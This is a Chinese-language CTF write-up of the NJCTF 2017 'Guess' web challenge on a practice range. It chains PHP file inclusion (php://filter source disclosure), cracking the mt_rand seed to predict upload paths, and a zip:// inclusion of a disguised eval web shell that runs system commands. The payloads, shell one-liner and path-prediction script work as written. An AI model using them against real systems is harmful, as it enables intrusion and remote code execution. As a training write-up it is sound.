title: 攻防世界 2017 NJCTF Web Guess
key: 9a75eef37ffd1f758d96d8b24f86b9a5
author: 3ND
tags:
  - Writeup
  - CTF
date: 2019-04-25 21:05:00
---
不错的一道题目，记录一下~

<!--more-->

## 0x01 文件上传

> http://111.198.29.45:30117/?page=upload (ADWorld攻防世界提供靶场)

打开题目发现疑似文件上传题目，随机选取一张图片上传后回显如下：

![image.png](https://i.loli.net/2019/08/09/4mzLAEepq86CkxX.png)

初步判断为(文件名校验)白名单+服务端验证。(那么上传成功后的文件在哪呢？

## 0x02 文件包含

简单探测后发现存在index.php、upload.php文件，观察URL中的`?page=upload`，可能存在文件包含漏洞?

> php://filter是一种元封装器，设计用于"数据流打开"时的"筛选过滤"应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启`allow_url_include`.

尝试使用**php://filter**伪协议读取源码,Payload:

```bash
//读取index.php
http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=index
//读取upload.php
http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=upload
```

解Base64后获取如下源码:

- index.php(部分)

```php
<?php
error_reporting(0);

session_start();
if(isset($_GET['page'])){
    $page=$_GET['page'];
}else{
    $page=null;
}

if(preg_match('/\.\./',$page))
{
    echo "<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>Attack Detected!</div>";
    die();
}

?>

<?php

if($page)
{
    if(!(include($page.'.php')))
    {
        echo "<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>error!</div>";
        exit;
    }
}
?>
```

- upload.php

```php
<?php
error_reporting(0);
function show_error_message($message)
{
    die("<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function show_message($message)
{
    echo("<div class=\"msg success\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function random_str($length = "32")
{
    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';

    for ($i = 1; $i <= $length; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }

    return $str;
}

session_start();



$reg='/gif|jpg|jpeg|png/';
if (isset($_POST['submit'])) {

    $seed = rand(0,999999999);
    mt_srand($seed);
    $ss = mt_rand();
    $hash = md5(session_id() . $ss);
    setcookie('SESSI0N', $hash, time() + 3600);

    if ($_FILES["file"]["error"] > 0) {
        show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
    }
    $check2 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
            || ($_FILES["file-upload-field"]["type"] == "image/jpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/png"))
        && ($_FILES["file-upload-field"]["size"] < 204800));
    $check3=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION));


    if ($check3) show_error_message("Nope!");
    if ($check2) {
        $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
        if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) {
            show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
        } else show_error_message("Something wrong with the upload...");
    } else {
        show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
    }
}
?>
```

## 0x03 种子爆破
对upload.php源代码进行审计，可得到如下信息:

1.上传文件校验方式为文件名白名单验证，很容易绕过进而上传含有恶意代码的图片格式文件。

2.成功上传的文件保存在如下路径:

```php
$filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
```

跟进`random_str()`函数:

```php
function random_str($length = "32")
{
    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';

    for ($i = 1; $i <= $length; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }

    return $str;
}
```

观察到想要预测random_str的值，需要获取`mt_rand()`函数的播种种子值。

> 参考文章：

> - [php的随机数的安全性分析](http://wonderkun.cc/index.html/?p=585)
> - [php_mt_seed - PHP mt_rand() seed cracker](https://www.openwall.com/php_mt_seed/)

跟进upload.php中的`$seed`：

```php
$seed = rand(0,999999999);
mt_srand($seed);
$ss = mt_rand();
$hash = md5(session_id() . $ss);
setcookie('SESSI0N', $hash, time() + 3600);
```

> mt_srand ([ int $seed ] ) : void 用 seed 来给随机数发生器播种。

这里使用`burpsuite`抓包修改PHPSESSION的值为空，则`session_id()`的返回值为空，此时Response中的SESSION参数的值即为`$hash`,即为`$ss`(播种随机数)经过MD5加密后的值。

## 0x04 攻击流程

- 1.构造恶意文件`pass.php`，压缩为`pass.zip`，修改后缀为`pass.png`后上传。

```php
//pass.php
<?php @eval($_GET["pass"]); ?>
```

- 2.上传时修改PHPSESSION为空，获取响应的SESSION进行在线MD5解密，获取播种后的随机数。

![image.png](https://i.loli.net/2019/08/09/F5ZEKxsTNrU2q7P.png)

由获取的播种后的随机数，借助种子爆破工具探测种子：

![image.png](https://i.loli.net/2019/08/09/Hzjuwite8YIZqFl.png)

- 3.根据获取的种子值进行播种，构造所有可能的文件保存路径，经过校验获取真实路径。

```php
//check.php
<?php
    $arr = array(116339511, 616856024);
    foreach($arr as $a) {
        mt_srand($a);
        $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
                 "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
                 "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
                 "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
                 "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
        $str = '';
        $ss = mt_rand();  // 这一步必须加上，否则与服务器端的随机值对应不上
        for ($i = 1; $i <= 32; ++$i) {
            $ch = mt_rand(0, count($set) - 1);
            $str .= $set[$ch];
        }
        echo 'http://111.198.29.45:30015/uP1O4Ds/' . $str . '_pass.png' . "\n";
    }
?>
```

- 2.借助文件包含漏洞，通过`zip://`伪协议读取恶意zip压缩文件，进而执行系统命令。

```bash
//payload url编码后提交
http://111.198.29.45:30117/?page=zip://uP1O4Ds/naIx79yt4YdpPMM4CeaFfXlmYMWdKFyh_pass.png#pass&pass=echo system("ls");
```

![image.png](https://i.loli.net/2019/08/09/Kyfx98tDMj3CqO4.png)

进而读取flag：

![image.png](https://i.loli.net/2019/08/09/NIGn8oDgmp6EyrQ.png)
